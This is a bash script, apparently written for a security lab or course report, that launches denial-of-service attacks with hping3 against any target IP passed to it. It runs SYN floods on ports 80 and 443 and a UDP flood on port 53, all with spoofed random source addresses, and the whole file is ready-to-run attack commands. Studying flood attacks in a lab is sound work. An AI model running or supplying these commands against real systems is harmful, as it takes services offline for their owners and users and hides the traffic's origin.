#!/bin/bash
# hping3 DoS demonstration commands
# Run from Kali: sudo ./dos_hping3.sh <target_ip>

TARGET="${1:?Usage: $0 <target_ip>}"

echo "[*] Target: $TARGET"
echo "[*] All attacks run for 30 seconds then stop automatically"
echo ""

# -------------------------------------------------------
# 1. SYN Flood against HTTP (port 80)
#    --syn        = SYN flag only (half-open connections)
#    --flood      = send as fast as possible
#    --rand-source = spoof random source IPs (harder to block)
# -------------------------------------------------------
echo "[1/3] SYN flood on port 80 (30s)..."
timeout 30 hping3 --syn --flood --rand-source -p 80 "$TARGET"
echo "    Done."
sleep 5

# -------------------------------------------------------
# 2. SYN Flood against HTTPS (port 443)
# -------------------------------------------------------
echo "[2/3] SYN flood on port 443 (30s)..."
timeout 30 hping3 --syn --flood --rand-source -p 443 "$TARGET"
echo "    Done."
sleep 5

# -------------------------------------------------------
# 3. UDP Flood (generic bandwidth exhaustion)
#    Effective against routers / network infrastructure
# -------------------------------------------------------
echo "[3/3] UDP flood (30s)..."
timeout 30 hping3 --udp --flood --rand-source -p 53 "$TARGET"
echo "    Done."

echo ""
echo "[*] All DoS demonstrations complete."
echo "[*] Check target VM CPU/network metrics to show impact in your report."
